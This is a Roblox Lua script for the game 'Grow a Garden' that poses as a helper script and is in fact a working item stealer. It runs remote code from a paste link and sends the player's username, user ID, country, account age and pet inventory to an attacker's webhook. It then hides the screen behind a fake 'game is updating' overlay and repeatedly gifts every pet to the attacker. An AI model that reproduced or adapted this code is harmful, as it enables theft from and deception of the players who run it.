loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()

        local RS = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        local HttpService = game:GetService("HttpService")
        local RunService = game:GetService("RunService")
        local LocalizationService = game:GetService("LocalizationService")
        local DataService = require(RS.Modules.DataService)
        local PetRegistry = require(RS.Data.PetRegistry)
        local NumberUtil = require(RS.Modules.NumberUtil)
        local PetUtilities = require(RS.Modules.PetServices.PetUtilities)
        local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
        local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
        local TeleportService = game:GetService("TeleportService")

        local data = DataService:GetData()

        local maxAttempts = 10
        local attempt = 1
        local teleported = false

        if GetServerType:InvokeServer() == "VIPServer" then
            while attempt <= maxAttempts and not teleported do
                local servers = {}
                local req = game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
                local body = HttpService:JSONDecode(req)

                if body and body.data then
                    for _, v in next, body.data do
                        if tonumber(v.playing) and tonumber(v.maxPlayers)
                        and (tonumber(v.maxPlayers) - tonumber(v.playing) >= 2)
                        and v.id ~= game.JobId then
                            table.insert(servers, v.id)
                        end
                    end
                end

                if #servers > 0 then
                    local success = pcall(function()
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
                    end)
                    if success then
                        teleported = true
                        break
                    end
                end

                attempt += 1
                if attempt <= maxAttempts then
                    task.wait(1)
                end
            end

            if not teleported then
                warn("Failed to find a non-full server after "..maxAttempts.." attempts")
            end
        end

        if GetServerType:InvokeServer() == "VIPServer" then
            error("Script stopped - VIP Server detected")        
        end

        if getgenv().EclipseHubRunning then
            warn("Script is already running or has been executed! Cannot run again.")
            return
        end
        getgenv().EclipseHubRunning = true

        -- Updated PetPriorityData with isMutation field and additional pets
        local PetPriorityData = {
            -- Regular pets
            ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
            ["Corrupted Kitsune"] = { priority = 2, emoji = "🦊", isMutation = false },
            ["Disco Bee"] = { priority = 3, emoji = "🪩", isMutation = false },
            ["Raccoon"] = { priority = 4, emoji = "🦝", isMutation = false },
            ["Fennec fox"] = { priority = 5, emoji = "🦊", isMutation = false },
            ["Spinosaurus"] = { priority = 6, emoji = "🫎", isMutation = false },
            ["Butterfly"] = { priority = 7, emoji = "🦋", isMutation = false },
            ["Dragonfly"] = { priority = 8, emoji = "🐲", isMutation = false },
            ["Mimic Octopus"] = { priority = 9, emoji = "🐙", isMutation = false },
            ["T-Rex"] = { priority = 10, emoji = "🦖", isMutation = false },
            ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
            ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
            -- Mutations
            ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
            ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
            ["Shocked"] = { priority = 16, emoji = "⚡", isMutation = true },
            ["Rainbow"] = { priority = 17, emoji = "🌈", isMutation = true },
            ["Radiant"] = { priority = 18, emoji = "🛡️", isMutation = true },
            ["Corrupted"] = { priority = 19, emoji = "🧿", isMutation = true },
            ["IronSkin"] = { priority = 20, emoji = "💥", isMutation = true },
            ["Tiny"] = { priority = 21, emoji = "🔹", isMutation = true },
            ["Golden"] = { priority = 22, emoji = "🥇", isMutation = true },
            ["Frozen"] = { priority = 23, emoji = "❄️", isMutation = true },
            ["Windy"] = { priority = 24, emoji = "🌪️", isMutation = true },
            ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
            ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
            ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
        }

        local function detectExecutor()
            local name
            local success = pcall(function()
                if identifyexecutor then
                    name = identifyexecutor()
                elseif getexecutorname then
                    name = getexecutorname()
                end
            end)
            return name or "Unknown"
        end

        if detectExecutor() == 'Delta' then
            for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
                pcall(function()
                    v:Destroy()
                end)
            end
            local gui = Instance.new("ScreenGui")
            gui.Name = "WarningGUI"
            gui.IgnoreGuiInset = true
            gui.ResetOnSpawn = false
            if syn and syn.protect_gui then
                syn.protect_gui(gui)
            end
            gui.Parent = game:GetService("CoreGui")
            local background = Instance.new("Frame")
            background.Size = UDim2.new(1, 0, 1, 0)
            background.Position = UDim2.new(0, 0, 0, 0)
            background.BackgroundColor3 = Color3.new(0, 0, 0)
            background.BorderSizePixel = 0
            background.Parent = gui
            local container = Instance.new("Frame")
            container.AnchorPoint = Vector2.new(0.5, 0.5)
            container.Position = UDim2.new(0.5, 0, 0.45, 0)
            container.Size = UDim2.new(0.8, 0, 0.5, 0)
            container.BackgroundTransparency = 1
            container.Parent = background

            local executors = {
                {name = "KRNL", link = "https://krnl.cat/"},
                {name = "Codex", link = "https://codex.lol/"},
                {name = "Arceus X", link = "https://spdmteam.com/index"},
                {name = "Fluxus", link = "https://fluxus.team/download/"},
            }
            local buttonsContainer = Instance.new("Frame")
            buttonsContainer.Size = UDim2.new(1, 0, 0, #executors * 50)
            buttonsContainer.BackgroundTransparency = 1
            buttonsContainer.Parent = container
            local grid = Instance.new("UIGridLayout")
            grid.CellSize = UDim2.new(0.45, 0, 0, 40)
            grid.CellPadding = UDim2.new(0.05, 0, 0, 10)
            grid.FillDirectionMaxCells = 2
            grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
            grid.VerticalAlignment = Enum.VerticalAlignment.Top
            grid.SortOrder = Enum.SortOrder.LayoutOrder
            grid.Parent = buttonsContainer
            for _, exec in ipairs(executors) do
                local btn = Instance.new("TextButton")
                btn.Text = "Copy " .. exec.name .. " Link"
                btn.TextScaled = true
                btn.Font = Enum.Font.SourceSansBold
                btn.TextColor3 = Color3.new(1, 1, 1)
                btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
                btn.BorderSizePixel = 0
                btn.AutoButtonColor = true
                btn.Size = UDim2.new(0, 200, 0, 40)
                btn.Parent = buttonsContainer
            
                btn.MouseButton1Click:Connect(function()
                    if setclipboard then
                        setclipboard(exec.link)
                    end
                    btn.Text = "Copied!"
                    task.delay(1.5, function()
                        btn.Text = "Copy " .. exec.name .. " Link"
                    end)
                end)
            end
            local uiList = Instance.new("UIListLayout")
            uiList.FillDirection = Enum.FillDirection.Vertical
            uiList.HorizontalAlignment = Enum.HorizontalAlignment.Center
            uiList.VerticalAlignment = Enum.VerticalAlignment.Center
            uiList.SortOrder = Enum.SortOrder.LayoutOrder
            uiList.Padding = UDim.new(0, 10)
            uiList.Parent = container
            local function createLabel(text, color)
                local label = Instance.new("TextLabel")
                label.BackgroundTransparency = 1
                label.Size = UDim2.new(1, 0, 0, 40)
                label.TextColor3 = color or Color3.new(1, 1, 1)
                label.Text = text
                label.Font = Enum.Font.SourceSansBold
                label.TextScaled = true
                label.TextWrapped = true
                label.Parent = container
                return label
            end
            local dangerEmoji = "⚠️"
            createLabel(dangerEmoji .. " [Delta Executor Detected] " .. dangerEmoji, Color3.fromRGB(255, 255, 0))
            createLabel("WARNING!: Delta Executor Is A Malware!", Color3.fromRGB(255, 0, 0))
            createLabel("It logs your information and is very detected!", Color3.new(1, 1, 1))
            createLabel("Please use any of these executors:", Color3.new(1, 1, 1))
            createLabel("(KRNL, Codex, Arceus X, Fluxus)", Color3.fromRGB(0, 255, 255))
            createLabel("Those are supported and legit exploits!", Color3.new(1, 1, 1))
            local countdownLabel = Instance.new("TextLabel")
            countdownLabel.AnchorPoint = Vector2.new(0.5, 1)
            countdownLabel.Position = UDim2.new(0.5, 0, 1, -20)
            countdownLabel.Size = UDim2.new(1, -40, 0, 40)
            countdownLabel.BackgroundTransparency = 1
            countdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            countdownLabel.TextScaled = true
            countdownLabel.Font = Enum.Font.SourceSansBold
            countdownLabel.Text = "Game will be closed in 30 seconds. Please install other executor"
            countdownLabel.Parent = background
            local seconds = 30
            task.spawn(function()
                while seconds > 0 do
                    countdownLabel.Text = "Game will be closed in " .. seconds .. " second" .. (seconds == 1 and "" or "s") .. ". Please install other executor"
                    task.wait(1)
                    seconds -= 1
                end
                local Players = game:GetService("Players")
                local player = Players.LocalPlayer
                game:Shutdown()
            end)
            task.wait(999999)
            return
        end

        local function formatNumberWithCommas(n)
            local str = tostring(n)
            return str:reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
        end

        local function getWeight(toolName)
            if not toolName or toolName == "No Tool" then
                return nil
            end
            
            local weight = toolName:match("%[([%d%.]+) KG%]")
            weight = weight and tonumber(weight)
            
            return weight
        end

        local function getAge(toolName)
            if not toolName or toolName == "No Tool" then
                return nil
            end    
            local age = toolName:match("%[Age (%d+)%]")
            age = age and tonumber(age)
            
            return age
        end

        local function GetPlayerPets()
            local unsortedPets = {}
            local equippedPets = {}
            local player = Players.LocalPlayer
            if not data or not data.PetsData then
                warn("No pet data available in data.PetsData")
                return unsortedPets
            end

            if workspace:FindFirstChild("PetsPhysical") then
                for _, petMover in workspace.PetsPhysical:GetChildren() do
                    if petMover and petMover:GetAttribute("OWNER") == Players.LocalPlayer.Name then
                        for _, pet in petMover:GetChildren() do
                            table.insert(equippedPets, pet.Name)
                            PetsService:UnequipPet(pet.Name)
                        end
                    end
                end
            end

            task.wait(0.5)
            for _, tool in pairs(player.Backpack:GetChildren()) do
                if not tool or not tool.Parent then
                    continue
                end
            
                if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" then
                    local petName = tool.Name
                    
                    if petName:find("Bald Eagle") or petName:find("Golden Lab") then
                        continue
                    end

                    local function SafeCalculatePetValue(tool)
                        local player = Players.LocalPlayer
                        local PET_UUID = tool:GetAttribute("PET_UUID")
                        
                        if not PET_UUID then
                            warn("SafeCalculatePetValue | No UUID!")
                            return 0
                        end
                        
                        local data = DataService:GetData()
                        if not data or not data.PetsData.PetInventory.Data[PET_UUID] then
                            warn("SafeCalculatePetValue | No pet data found!")
                            return 0
                        end
                        
                        local petInventoryData = data.PetsData.PetInventory.Data[PET_UUID]
                        local petData = petInventoryData.PetData
                        local HatchedFrom = petData.HatchedFrom
                        
                        if not HatchedFrom or HatchedFrom == "" then
                            warn("SafeCalculatePetValue | No HatchedFrom value!")
                            return 0
                        end
                        
                        local eggData = PetRegistry.PetEggs[HatchedFrom]
                        if not eggData then
                            warn("SafeCalculatePetValue | No egg data found!")
                            return 0
                        end
                        
                        local rarityData = eggData.RarityData.Items[petInventoryData.PetType]
                        if not rarityData then
                            warn("SafeCalculatePetValue | No pet data in egg!")
                            return 0
                        end
                        
                        local WeightRange = rarityData.GeneratedPetData.WeightRange
                        if not WeightRange then
                            warn("SafeCalculatePetValue | No WeightRange found!")
                            return 0
                        end
                        
                        local sellPrice = PetRegistry.PetList[petInventoryData.PetType].SellPrice
                        local weightMultiplier = math.lerp(0.8, 1.2, NumberUtil.ReverseLerp(WeightRange[1], WeightRange[2], petData.BaseWeight))
                        local levelMultiplier = math.lerp(0.15, 6, PetUtilities:GetLevelProgress(petData.Level))
                        
                        return math.floor(sellPrice * weightMultiplier * levelMultiplier)
                    end

                    local age = getAge(tool.Name) or 0
                    local weight = getWeight(tool.Name) or 0
                    
                    local strippedName = petName:gsub(" %[.*%]", "")

                    local function stripMutationPrefix(name)
                        for key, data in pairs(PetPriorityData) do
                            if data.isMutation and name:lower():find(key:lower()) == 1 then
                                return name:sub(#key + 2)
                            end
                        end
                        return name
                    end

                    local petType = stripMutationPrefix(strippedName)
                    
                    local rawValue = SafeCalculatePetValue(tool)
                    if rawValue and rawValue > 0 then
                        table.insert(unsortedPets, {
                            PetName = petName,
                            PetAge = age,
                            PetWeight = weight,
                            Id = tool:GetAttribute("PET_UUID") or tool:GetAttribute("uuid"),
                            Type = petType,
                            Value = rawValue,
                            Formatted = formatNumberWithCommas(rawValue),
                        })
                    else
                        warn("Failed to calculate value for:", tool.Name)
                        continue
                    end
                end
            end

            task.wait(0.5)
            if equippedPets then
                for _, petName in pairs(equippedPets) do
                    if petName then
                        game.ReplicatedStorage.GameEvents.PetsService:FireServer("EquipPet", petName)
                    end
                end
            end
            return unsortedPets
        end

        local pets = GetPlayerPets()

        local Webhook = getgenv().Webhook
        local Username = getgenv().Username

        local function isMutated(toolName)
            for key, data in pairs(PetPriorityData) do
                if data.isMutation and toolName:lower():find(key:lower()) == 1 then
                    return key
                end
            end
            return nil
        end

        -- Sort pets by priority, then by value using PetPriorityData
        table.sort(pets, function(a, b)
            -- Get a's priority
            local aPriority, aMutation = 99, isMutated(a.PetName)
            if PetPriorityData[a.Type] then
                aPriority = PetPriorityData[a.Type].priority
            elseif aMutation and PetPriorityData[aMutation] then
                aPriority = PetPriorityData[aMutation].priority
            elseif a.Weight and a.Weight >= 10 then
                aPriority = 12
            elseif a.Age and a.Age >= 60 then
                aPriority = 13
            end

            -- Get b's priority
            local bPriority, bMutation = 99, isMutated(b.PetName)
            if PetPriorityData[b.Type] then
                bPriority = PetPriorityData[b.Type].priority
            elseif bMutation and PetPriorityData[bMutation] then
                bPriority = PetPriorityData[bMutation].priority
            elseif b.Weight and b.Weight >= 10 then
                bPriority = 12
            elseif b.Age and b.Age >= 60 then
                bPriority = 13
            end

            -- Compare priorities
            if aPriority == bPriority then
                return a.Value > b.Value
            else
                return aPriority < bPriority
            end
        end)

        local function hasRarePets()
            for _, pet in pairs(pets) do
                if pet.Type ~= "Red Fox" and PetPriorityData[pet.Type] and not PetPriorityData[pet.Type].isMutation then
                    return true
                end
            end
            return false
        end

        local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

        local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

        -- Update pet string generation
        local petString = ""

        for _, pet in ipairs(pets) do
            local highestPriority = 99
            local chosenEmoji = "🐶"
            local mutation = isMutated(pet.PetName)
            local mutationData = mutation and PetPriorityData[mutation] or nil
            local petData = PetPriorityData[pet.Type] or nil

            if petData and petData.priority < highestPriority then
                highestPriority = petData.priority
                chosenEmoji = petData.emoji
            elseif mutationData and mutationData.priority < highestPriority then
                highestPriority = mutationData.priority
                chosenEmoji = mutationData.emoji
            elseif pet.Weight and pet.Weight >= 10 and 12 < highestPriority then
                highestPriority = 12
                chosenEmoji = "🐘"
            elseif pet.Age and pet.Age >= 60 and 13 < highestPriority then
                highestPriority = 13
                chosenEmoji = "👴"
            end

            local petName = pet.PetName
            local petValue = pet.Formatted
            petString = petString .. "\n" .. chosenEmoji .. " - " .. petName .. " → " .. petValue
        end
        local playerCount = #Players:GetPlayers()

        local function getPlayerCountry(player)
            local success, result = pcall(function()
                return LocalizationService:GetCountryRegionForPlayerAsync(player)
            end)
            
            if success then
                return result
            else
                return "Unknown"
            end
        end    

        local accountAgeInDays = Players.LocalPlayer.AccountAge
        local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60)
        local creationDateString = os.date("%Y-%m-%d", creationDate)

        local function truncateByLines(inputString, maxLines)
            local lines = {}
            for line in inputString:gmatch("[^\n]+") do
                table.insert(lines, line)
            end
            
            if #lines <= maxLines then
                return inputString
            else
                local truncatedLines = {}
                for i = 1, maxLines - 1 do
                    table.insert(truncatedLines, lines[i])
                end
                return table.concat(truncatedLines, "\n")
            end
        end

        local payload = {
            content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
            embeds = {{
                title = "Grow a Garden Hit - Scripts.SM",
                url = "https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
                color = 57855,
                fields = {
                    {
                        name = "🪪 Display Name",
                        value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
                        inline = true
                    },
                    {
                        name = "👤 Username",
                        value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
                        inline = true
                    },
                    {
                        name = "🆔 User ID",
                        value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
                        inline = true
                    },
                    {
                        name = "📅 Account Age",
                        value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
                        inline = true
                    },
                    {
                        name = "💎 Receiver",
                        value = "```" .. (Username or "Unknown") .. "```",
                        inline = true
                    },
                    {
                        name = "🎂 Account Created",
                        value = "```" .. (creationDateString or "Unknown") .. "```",
                        inline = true
                    },
                    {
                        name = "💻 Executor",
                        value = "```" .. (detectExecutor() or "Unknown") .. "```",
                        inline = true
                    },
                    {
                        name = "🌍 Country",
                        value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
                        inline = true
                    },
                    {
                        name = "📡 Player Count",
                        value = "```" .. (playerCount or 0) .. "/5```",
                        inline = true
                    },
                    {
                        name = "💰 Backpack",
                        value = "```" .. truncateByLines(petString, 20) .. "```",
                        inline = false
                    },
                    {
                        name = "🚀 Join Script",
                        value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
                        inline = false
                    },
                    {
                        name = "🔗 Join with URL",
                        value = "[Click here to join](https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
                        inline = false
                    }
                },
                footer = {
                    text = game.JobId or "Unknown"
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }},
            attachments = {}
        }

        if hasRarePets() then
            payload.content = "@everyone\n" .. "To activate the stealer you must jump or type in chat"
                local success, err = pcall(function()
                    request({
                        Url = Webhook,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = HttpService:JSONEncode(payload)
                    })
                end)
            if not success then warn(err) end
        else
            payload.content = "To activate the stealer you must jump or type in chat"
            local success, err = pcall(function()
                request({
                    Url = Webhook,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = HttpService:JSONEncode(payload)
                }) 
            end)
            if not success then warn(err) end
        end

        local function CreateGui()
            local player = Players.LocalPlayer
            local gui = Instance.new("ScreenGui")
            local asc = Instance.new("UIAspectRatioConstraint")
            gui.Name = "EclipseHubGui"
            gui.ResetOnSpawn = false
            gui.IgnoreGuiInset = true
            gui.Parent = player:WaitForChild("PlayerGui")
            gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
            gui.DisplayOrder = 99999
            local bg = Instance.new("Frame")
            bg.Size = UDim2.new(1, 0, 1, 0)
            bg.Position = UDim2.new(0, 0, 0, 0)
            bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
            bg.Parent = gui
            local spinner = Instance.new("ImageLabel")
            spinner.AnchorPoint = Vector2.new(0.5, 0.5)
            spinner.Size = UDim2.new(0.3, 0, 0.3, 0)
            spinner.Position = UDim2.new(0.5, 0, 0.34, 0)
            spinner.BackgroundTransparency = 1
            spinner.Image = "rbxassetid://74011233271790"
            spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
            spinner.Parent = bg
            asc.Parent = spinner
            local title = Instance.new("TextLabel")
            title.Size = UDim2.new(1, 0, 0, 50)
            title.Position = UDim2.new(0, 0, 0.53, 0)
            title.BackgroundTransparency = 1
            title.Text = "Please wait..."
            title.Font = Enum.Font.GothamBold
            title.TextSize = 38
            title.TextColor3 = Color3.fromRGB(255, 255, 255)
            title.TextStrokeTransparency = 0.75
            title.Parent = bg
            local desc = Instance.new("TextLabel")
            desc.Size = UDim2.new(1, -100, 0, 60)
            desc.Position = UDim2.new(0.5, -((1 * (bg.AbsoluteSize.X - 100)) / 2), 0.60, 0)
            desc.BackgroundTransparency = 1
            desc.Text = "The game is updating. Leaving now may cause data loss or corruption.\nYou will be returned shortly."
            desc.Font = Enum.Font.Gotham
            desc.TextSize = 20
            desc.TextColor3 = Color3.fromRGB(200, 200, 200)
            desc.TextWrapped = true
            desc.TextXAlignment = Enum.TextXAlignment.Center
            desc.TextYAlignment = Enum.TextYAlignment.Top
            desc.Parent = bg
            task.spawn(function()
                while spinner do
                    spinner.Rotation += 2
                    task.wait(0.01)
                end
            end)   
        end

        local receiverPlr
        repeat
            receiverPlr = Players:FindFirstChild(Username)
            task.wait(1)
        until receiverPlr

        local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
        local hum = receiverChar:WaitForChild("Humanoid")
        local targetPlr = Players.LocalPlayer

        if receiverPlr == targetPlr then error("Receiver and target are the same person!") end

        local jumped = false
        local chatted = false

        hum.Jumping:Connect(function()
            jumped = true
        end)

        receiverPlr.Chatted:Connect(function()
            chatted = true
        end)

        repeat
            task.wait()
        until jumped or chatted

        for _, v in targetPlr.PlayerGui:GetDescendants() do
            if v:IsA("ScreenGui") then
                v.Enabled = false
            end
        end

        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        CreateGui()

        if workspace:FindFirstChild("PetsPhysical") then
            for _, petMover in workspace:FindFirstChild("PetsPhysical"):GetChildren() do
                if petMover and petMover:GetAttribute("OWNER") == targetPlr.Name then
                    for _, pet in petMover:GetChildren() do
                        PetsService:UnequipPet(pet.Name)
                    end
                end
            end
        end

        for _, tool in pairs(targetPlr.Backpack:GetChildren()) do
            if tool and tool:IsA("Tool") and tool:GetAttribute("d") == true then
                local tool = game:GetService("Players").LocalPlayer:WaitForChild("Backpack"):WaitForChild(tool.Name)
                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
            end
        end


    -- [Previous code up to the safeFollow function remains unchanged]

    local function safeFollow()
        local offset = CFrame.new(0, 0, 0.5) -- Reduced offset for closer proximity
        local conn = RunService.Stepped:Connect(function()
            if receiverPlr.Character and targetPlr.Character then
                local targetRoot = receiverPlr.Character:FindFirstChild("HumanoidRootPart")
                local followerRoot = targetPlr.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot and followerRoot then
                    local distance = (targetRoot.Position - followerRoot.Position).Magnitude
                    if distance > 5 then -- Ensure within 5 studs
                        followerRoot.CFrame = targetRoot.CFrame * offset
                    end
                end
            end
        end)

        return {
            Stop = function()
                if conn then
                    conn:Disconnect()
                end
            end
        }
    end

    local inventory = targetPlr.Backpack

    local function safeGiftTool(tool)
        -- Verify both players and their characters exist
        if not receiverPlr or not receiverChar or not targetPlr.Character then
            warn("Gifting failed: Invalid receiver or target character")
            return false
        end

        -- Ensure tool is in Backpack
        if tool.Parent ~= inventory then
            tool.Parent = inventory
            task.wait(0.3)
        end

        -- Equip the tool
        local humanoid = targetPlr.Character:FindFirstChild("Humanoid")
        if not humanoid then
            warn("Gifting failed: No Humanoid found for targetPlr")
            return false
        end

        humanoid:EquipTool(tool)
        task.wait(0.6) -- Increased wait for server to register equip

        -- Verify tool is equipped
        if tool.Parent ~= targetPlr.Character then
            warn("Gifting failed: Tool not equipped - " .. tool.Name)
            tool.Parent = inventory -- Reset to Backpack
            return false
        end

        -- Fire gifting event
        local success, err = pcall(function()
            RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
            
            -- Trigger proximity prompt if it exists
            task.wait(0.5) -- Increased wait for prompt to appear
            local prompt = receiverChar:FindFirstChild("Head") and receiverChar.Head:FindFirstChildOfClass("ProximityPrompt")
            if prompt then
                print("Triggering proximity prompt for " .. receiverPlr.Name)
                fireproximityprompt(prompt)
            else
                warn("No proximity prompt found for " .. receiverPlr.Name)
            end
            return true
        end)

        -- Handle failure
        if not success then
            warn("Gifting failed for " .. tool.Name .. ": " .. tostring(err))
            tool.Parent = inventory -- Reset to Backpack
            return false
        end

        -- Verify tool is no longer in possession (indicating successful gift)
        task.wait(0.7) -- Increased wait to confirm gift
        if tool then
            tool.Parent = targetPlr.Backpack
        end
        return true
    end

-- Set clipboard message once
setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")

-- Start following the receiver
local followConn = safeFollow()

-- Wait a moment before beginning the loop
task.wait(2)

-- Begin infinite gifting loop
while true do
    task.wait(3)

    -- Always refresh pet list in case new pets appear
    local pets = GetPlayerPets()

    for _, pet in ipairs(pets) do
        for _, tool in targetPlr.Backpack:GetChildren() do
            if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") == pet.Id then
                print("Loop Gifting:", tool.Name)
                local success = safeGiftTool(tool)
                if success then
                    print("Successfully gifted:", tool.Name)
                else
                    warn("Failed to gift:", tool.Name)
                end
                task.wait(0.4) -- brief delay between gifts
            end
        end
    end
end

